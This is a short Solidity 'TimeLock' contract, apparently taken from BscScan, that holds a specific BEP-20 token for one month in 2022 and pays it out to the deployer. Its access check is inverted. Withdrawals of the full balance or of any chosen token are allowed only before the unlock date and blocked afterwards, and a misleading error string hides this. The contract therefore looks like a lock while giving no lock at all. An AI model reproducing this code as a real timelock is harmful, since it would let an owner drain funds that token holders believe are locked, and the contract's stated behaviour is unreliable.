/**
 *Submitted for verification at BscScan.com on 2022-07-27
*/

// SPDX-License-Identifier: Unlicensed




pragma solidity =0.7.6;


contract TimeLock {

    address public Owner;
    address public constant Token = 0x7d995920cd166E6278435aCed3B47B9cFc42c9f2;

    uint256 public constant StartLock = 1658943000;     // Wed Jul 27 2022 17:30:00 GMT+0000
    uint256 public constant LockedUntil = 1661621400;   // Sat Aug 27 2022 17:30:00 GMT+0000

	uint256 constant Decimals = 18;
	uint256 constant incrementAmount = 10 ** (5 + Decimals);
	
    
    // Constructor. 
   constructor() payable {  
		Owner = payable(msg.sender);
    }  
    

    // Modifiers
    modifier checkRequirements {
        require(StartLock < block.timestamp, "Time travel is not allowed!");
		require(LockedUntil > block.timestamp, "Locking period is not over!");
		require(msg.sender == Owner, "Admin function!");
        _;
    }
    

    function payOutIncrementToken() external checkRequirements {
        TIMELOCK(Token).transfer(Owner, incrementAmount);
    }
    
    
    function payOutTotalToken() external checkRequirements {
        uint256 balance = TIMELOCK(Token).balanceOf(address(this));
		TIMELOCK(Token).transfer(Owner, balance);
    }

    function payOutCustomAmountToken(address tokenAddress, uint tokens) external checkRequirements {
        TIMELOCK(tokenAddress).transfer(Owner, tokens);
    }

}

// Interface for TIMELOCK
abstract contract TIMELOCK {
    function balanceOf(address tokenOwner) virtual external view returns (uint256);
    function transfer(address receiver, uint256 numTokens) virtual public returns (bool);
}